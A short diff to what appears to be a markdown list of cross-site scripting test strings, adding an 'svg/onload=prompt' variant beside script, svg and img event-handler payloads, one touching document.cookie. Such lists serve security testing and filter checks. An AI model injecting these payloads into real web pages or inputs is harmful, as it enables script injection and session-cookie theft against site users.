@@ -3,7 +3,8 @@
 ## Test Strings
 ```
 <script>onerror=alert;throw 1</script>
-<svg onload=alert(1) 
+<svg onload=alert(1)
+<svg/onload=prompt(1) 
 <img src=x onerror=alert('XSS');>
 <img/src/onerror=prompt(8)>
 <img/src/onerror=alert(document.cookie;)>
